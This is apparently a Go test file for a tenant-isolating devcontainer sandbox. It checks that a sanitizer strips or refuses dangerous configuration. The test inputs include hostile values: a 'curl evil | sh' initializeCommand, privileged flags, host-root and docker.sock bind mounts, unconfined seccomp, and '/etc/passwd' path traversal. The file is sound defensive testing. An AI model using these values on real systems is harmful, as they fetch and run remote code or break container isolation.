package sandbox

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"
)

const testTenant = "0123456789abcdef"

func TestValidTenantTagAndTaskWire(t *testing.T) {
	for _, ok := range []string{testTenant} {
		if !ValidTenantTag(ok) {
			t.Fatalf("%q must be valid", ok)
		}
	}
	for _, bad := range []string{"", "0123456789ABCDEF", "0123456789abcde", "0123456789abcdef0", "../../etc/passwd"} {
		if ValidTenantTag(bad) {
			t.Fatalf("%q must be refused", bad)
		}
	}
	var task Task
	if err := json.Unmarshal([]byte(`{"id":"sbt_1","kind":"create","sandboxId":"s1","tenant":"`+testTenant+`","managed":true}`), &task); err != nil {
		t.Fatal(err)
	}
	if task.Tenant != testTenant || !task.Managed {
		t.Fatalf("%+v", task)
	}
	task.Tenant = "NOPE"
	if validateV2(task) == nil {
		t.Fatal("an invalid tenant tag must be refused")
	}
}

func TestManagedNamesFitLinuxLimits(t *testing.T) {
	if b := ManagedBridgeName(testTenant); len(b) > 15 || !strings.HasPrefix(b, "nx-") {
		t.Fatalf("bridge name %q", b)
	}
	if ManagedNetworkName(testTenant) != "nexal-t-"+testTenant || ManagedSliceName("nexal-tenants", testTenant) != "nexal-tenants-"+testTenant+".slice" {
		t.Fatal("names")
	}
	args := strings.Join(ManagedNetworkCreateArgs(testTenant), " ")
	if !strings.Contains(args, "com.docker.network.bridge.name=nx-0123456789ab") || !strings.Contains(args, "nexal.tenant="+testTenant) {
		t.Fatal(args)
	}
}

func TestManagedRunArgs(t *testing.T) {
	got := ManagedRunArgs(ManagedConfig{SlicePrefix: "nexal-tenants", StorageOpt: true}, testTenant, "nexal-sb1", Size{CPUs: 2, MemoryMB: 2048, DiskGB: 10})
	want := []string{"--network=nexal-t-" + testTenant, "--label=nexal.tenant=" + testTenant, "--label=nexal.workspace=nexal-sb1", "--label=nexal.managed=1",
		"--cgroup-parent=nexal-tenants-" + testTenant + ".slice", "--cpus=2", "--memory=2048m", "--memory-swap=2048m", "--pids-limit=4096", "--storage-opt=size=10G"}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("got %v", got)
	}
	if a := strings.Join(ManagedRunArgs(ManagedConfig{}, testTenant, "w", Size{}), " "); strings.Contains(a, "cgroup-parent") || strings.Contains(a, "storage-opt") {
		t.Fatal(a)
	}
}

func TestSanitizeManagedDevcontainer(t *testing.T) {
	in := map[string]any{
		"name": "x", "image": "img", "runArgs": []any{"--privileged", "-v", "/:/host"}, "privileged": true,
		"mounts": []any{"source=/,target=/host,type=bind"}, "capAdd": []any{"SYS_ADMIN"}, "securityOpt": []any{"seccomp=unconfined"},
		"initializeCommand": "curl evil | sh", "workspaceMount": "source=/,target=/w,type=bind", "appPort": 22, "init": true,
		"postCreateCommand": "make", "remoteUser": "vscode",
		"features": map[string]any{
			"ghcr.io/devcontainers/features/go:1": map[string]any{}, "ghcr.io/devcontainers/features/docker-outside-of-docker:1": map[string]any{},
			"ghcr.io/devcontainers/features/docker-in-docker": map[string]any{}, "ghcr.io/evil/features/root:1": map[string]any{},
		},
		"build": map[string]any{"dockerfile": "Dockerfile", "context": "..", "options": []any{"--network=host"}},
	}
	out, dropped, err := SanitizeManagedDevcontainer(in, ".devcontainer", []string{"--network=nexal-t-" + testTenant})
	if err != nil {
		t.Fatal(err)
	}
	for _, k := range []string{"privileged", "mounts", "capAdd", "securityOpt", "initializeCommand", "workspaceMount", "appPort", "init"} {
		if _, ok := out[k]; ok {
			t.Errorf("%s must be dropped", k)
		}
	}
	if !reflect.DeepEqual(out["runArgs"], []any{"--network=nexal-t-" + testTenant}) {
		t.Fatalf("runArgs must be ours only: %v", out["runArgs"])
	}
	if out["postCreateCommand"] != "make" || out["remoteUser"] != "vscode" {
		t.Fatal("allowed properties must stay")
	}
	if f := out["features"].(map[string]any); len(f) != 1 || f["ghcr.io/devcontainers/features/go:1"] == nil {
		t.Fatalf("features: %v", f)
	}
	if b := out["build"].(map[string]any); b["options"] != nil || b["context"] != ".." {
		t.Fatalf("build: %v", b)
	}
	if !strings.Contains(strings.Join(dropped, ","), "initializeCommand") || !strings.Contains(strings.Join(dropped, ","), "build.options") {
		t.Fatalf("dropped: %v", dropped)
	}
	for _, bad := range []map[string]any{
		{"dockerComposeFile": "compose.yml", "service": "app"},
		{"build": map[string]any{"dockerfile": "Dockerfile", "context": "../.."}},
		{"build": map[string]any{"dockerfile": "/etc/passwd"}},
		{"name": "no image"},
	} {
		if _, _, err := SanitizeManagedDevcontainer(bad, ".devcontainer", nil); DevErrorCode(err) != DevErrInvalid {
			t.Errorf("%v must be refused: %v", bad, err)
		}
	}
	// At the repository root, ".." leaves the tree.
	if _, _, err := SanitizeManagedDevcontainer(map[string]any{"build": map[string]any{"context": ".."}}, ".", nil); err == nil {
		t.Fatal("context .. from the root must be refused")
	}
}

func TestManagedFeatureAllowed(t *testing.T) {
	for id, want := range map[string]bool{
		"ghcr.io/devcontainers/features/node:1": true, "ghcr.io/devcontainers/features/python": true,
		"ghcr.io/devcontainers/features/docker-in-docker:2": false, "ghcr.io/devcontainers/features/docker-outside-of-docker@sha256:x": false,
		"ghcr.io/devcontainers/features/a/b": false, "ghcr.io/someone/features/node:1": false, "./local-feature": false,
	} {
		if ManagedFeatureAllowed(id) != want {
			t.Errorf("%s: want %v", id, want)
		}
	}
}

func TestStripJSONC(t *testing.T) {
	in := `{
  // comment
  "image": "a//b", /* block
  comment */ "x": "say \"hi\" // not a comment",
  "list": [1, 2,],
}`
	var m map[string]any
	if err := json.Unmarshal(StripJSONC([]byte(in)), &m); err != nil {
		t.Fatalf("%v: %s", err, StripJSONC([]byte(in)))
	}
	if m["image"] != "a//b" || m["x"] != `say "hi" // not a comment` || len(m["list"].([]any)) != 2 {
		t.Fatalf("%v", m)
	}
}

func TestRuntimeCandidatesOnLinux(t *testing.T) {
	f := &fakeRun{}
	env := fakeEnv(f, "/var/run/docker.sock")
	env.GOOS = "linux"
	rt, err := DetectRuntime(context.Background(), env)
	if err != nil || rt.Name != RuntimeDocker || rt.Socket != "/var/run/docker.sock" {
		t.Fatalf("%+v %v", rt, err)
	}
	env = fakeEnv(f, "/run/user/1001/docker.sock", "/var/run/docker.sock")
	env.GOOS, env.DockerSocket = "linux", "/run/user/1001/docker.sock"
	if rt, err = DetectRuntime(context.Background(), env); err != nil || rt.Socket != "/run/user/1001/docker.sock" {
		t.Fatalf("override: %+v %v", rt, err)
	}
	// macOS keeps refusing the plain engine socket path (it would be Docker Desktop's).
	if _, err := DetectRuntime(context.Background(), fakeEnv(f, "/var/run/docker.sock")); err == nil {
		t.Fatal("on macOS /var/run/docker.sock is not a supported runtime")
	}
}

func newManagedTestDevPod(f *fakeRun, dir string, gitFiles map[string]string) *DevPod {
	env := fakeEnv(f, "/var/run/docker.sock")
	env.GOOS = "linux"
	env.LookPath = func(n string) (string, error) {
		if n == "docker" || n == "devpod" || n == "git" {
			return "/usr/bin/" + n, nil
		}
		return "", errors.New("not found")
	}
	inner := env.Run
	env.Run = func(ctx context.Context, e []string, name string, args ...string) ([]byte, error) {
		if strings.HasSuffix(name, "git") {
			f.mu.Lock()
			f.cmds = append(f.cmds, name+" "+strings.Join(args, " "))
			f.mu.Unlock()
			dest := args[len(args)-1]
			for rel, body := range gitFiles {
				p := filepath.Join(dest, filepath.FromSlash(rel))
				_ = os.MkdirAll(filepath.Dir(p), 0o700)
				_ = os.WriteFile(p, []byte(body), 0o600)
			}
			return nil, nil
		}
		return inner(ctx, e, name, args...)
	}
	mc := DefaultManagedConfig()
	return NewDevPod(DevConfig{Env: env, StateDir: dir, MeshImage: "mesh:1", Managed: &mc, Sleep: func(time.Duration) {}})
}

func managedUpSpec() DevUpSpec {
	s := upSpec()
	s.Tenant = testTenant
	return s
}

func readDef(t *testing.T, dir, rel string) map[string]any {
	t.Helper()
	b, err := os.ReadFile(filepath.Join(dir, "nexal-sb1", "src", filepath.FromSlash(rel)))
	if err != nil {
		t.Fatal(err)
	}
	var m map[string]any
	if err := json.Unmarshal(b, &m); err != nil {
		t.Fatal(err)
	}
	return m
}

func TestManagedUpIsolatesTheTenant(t *testing.T) {
	dir := t.TempDir()
	f := &fakeRun{noNetwork: true, logs: "NEXAL-FIRSTBOOT {\"meshIp\":\"100.64.1.9\"}\n"}
	d := newManagedTestDevPod(f, dir, nil)
	s := managedUpSpec()
	s.Tenant = ""
	if _, err := d.Up(context.Background(), s); DevErrorCode(err) != DevErrInvalid {
		t.Fatalf("a managed host needs the tenant tag: %v", err)
	}
	res, err := d.Up(context.Background(), managedUpSpec())
	if err != nil || res.MeshIP != "100.64.1.9" {
		t.Fatalf("%+v %v", res, err)
	}
	if !f.saw("network create --driver bridge --label nexal.tenant="+testTenant) || !f.saw("nexal.managed=1 -o com.docker.network.bridge.name=nx-0123456789ab nexal-t-"+testTenant) {
		t.Fatalf("tenant network: %v", f.cmds)
	}
	if !f.saw("devpod up " + filepath.Join(dir, "nexal-sb1", "src")) {
		t.Fatalf("devpod must build from the sanitized local copy: %v", f.cmds)
	}
	if !f.saw("--label nexal.tenant="+testTenant) || !f.saw("--cgroup-parent=nexal-tenants-"+testTenant+".slice") {
		t.Fatalf("sidecar labels and slice: %v", f.cmds)
	}
	m := readDef(t, dir, ".devcontainer/devcontainer.json")
	args, _ := json.Marshal(m["runArgs"])
	if !strings.Contains(string(args), "--network=nexal-t-"+testTenant) || !strings.Contains(string(args), "--memory-swap=2048m") {
		t.Fatalf("runArgs: %s", args)
	}
}

func TestManagedUpSanitizesARepository(t *testing.T) {
	dir := t.TempDir()
	f := &fakeRun{logs: "NEXAL-FIRSTBOOT {\"meshIp\":\"100.64.1.9\"}\n"}
	repo := map[string]string{
		".devcontainer/devcontainer.json": `{
  // a repository definition
  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
  "initializeCommand": "touch /tmp/pwned",
  "mounts": ["source=/var/run/docker.sock,target=/var/run/docker.sock,type=bind"],
  "runArgs": ["--privileged"],
}`,
		".devcontainer.json": `{"image":"other","privileged":true}`,
	}
	d := newManagedTestDevPod(f, dir, repo)
	s := managedUpSpec()
	s.Devcontainer = Devcontainer{RepoURL: "https://github.com/x/y"}
	if _, err := d.Up(context.Background(), s); err != nil {
		t.Fatal(err)
	}
	if !f.saw("git -c core.hooksPath=/dev/null") || !f.saw("--no-recurse-submodules -- https://github.com/x/y") {
		t.Fatalf("clone: %v", f.cmds)
	}
	m := readDef(t, dir, ".devcontainer/devcontainer.json")
	if m["initializeCommand"] != nil || m["mounts"] != nil || strings.Contains(func() string { b, _ := json.Marshal(m["runArgs"]); return string(b) }(), "privileged") {
		t.Fatalf("not sanitized: %v", m)
	}
	if _, err := os.Stat(filepath.Join(dir, "nexal-sb1", "src", ".devcontainer.json")); !os.IsNotExist(err) {
		t.Fatal("a second, unsanitized definition must not remain")
	}
}

func TestManagedUpRefusesCompose(t *testing.T) {
	f := &fakeRun{logs: "NEXAL-FIRSTBOOT {\"meshIp\":\"100.64.1.9\"}\n"}
	d := newManagedTestDevPod(f, t.TempDir(), nil)
	s := managedUpSpec()
	s.Devcontainer = Devcontainer{JSON: `{"dockerComposeFile":"c.yml","service":"a"}`}
	if _, err := d.Up(context.Background(), s); DevErrorCode(err) != DevErrInvalid {
		t.Fatalf("compose must be refused: %v", err)
	}
	if f.saw("devpod up") {
		t.Fatal("nothing may start")
	}
}

func TestManagedRestartResanitizesTheWorkspace(t *testing.T) {
	dir := t.TempDir()
	f := &fakeRun{logs: "NEXAL-FIRSTBOOT {\"meshIp\":\"100.64.1.9\"}\n"}
	d := newManagedTestDevPod(f, dir, nil)
	s := managedUpSpec()
	s.Lifecycle = LifecyclePersistent
	if _, err := d.Up(context.Background(), s); err != nil {
		t.Fatal(err)
	}
	// The owner edits the definition from inside the container (src is the workspace).
	p := filepath.Join(dir, "nexal-sb1", "src", ".devcontainer", "devcontainer.json")
	if err := os.WriteFile(p, []byte(`{"image":"x","privileged":true,"initializeCommand":"id"}`), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := d.Up(context.Background(), s); err != nil { // restart: Recreate false, workspace kept
		t.Fatal(err)
	}
	m := readDef(t, dir, ".devcontainer/devcontainer.json")
	if m["privileged"] != nil || m["initializeCommand"] != nil || m["image"] != "x" {
		t.Fatalf("restart must re-sanitize: %v", m)
	}
}

func TestParseMemInfo(t *testing.T) {
	mb, err := ParseMemInfoTotalMB("MemTotal:       32768000 kB\nMemFree: 1 kB\n")
	if err != nil || mb != 32000 {
		t.Fatalf("%d %v", mb, err)
	}
	if _, err := ParseMemInfoTotalMB("nothing"); err == nil {
		t.Fatal("must fail")
	}
}

func TestManagedHostingConfig(t *testing.T) {
	c, err := ParseHostingConfig([]byte(`{"enabled":true,"maxSandboxes":40,"managed":true}`))
	if err != nil || c.MaxSandboxes != 40 || c.Caps().MaxCPUFraction != 0.85 {
		t.Fatalf("%+v %v", c, err)
	}
	if _, err := ParseHostingConfig([]byte(`{"enabled":true,"maxSandboxes":40}`)); err == nil {
		t.Fatal("a Mac stays at 10")
	}
}

func TestTenantSurvivesARejoin(t *testing.T) {
	b := bootInfoFrom(Task{SandboxID: "s1", Tenant: testTenant, SandboxKind: SandboxDevcontainer, Devcontainer: &Devcontainer{Template: "go"}})
	if b.Tenant != testTenant {
		t.Fatal("boot info must keep the tenant")
	}
	// The stored tenant wins over a rejoin task's.
	if got := rebootTask(*b, Task{TaskID: "t", SandboxID: "s1", Kind: KindRejoin, Tenant: "ffffffffffffffff", Managed: true}); got.Tenant != testTenant || !got.Managed {
		t.Fatalf("%+v", got)
	}
}
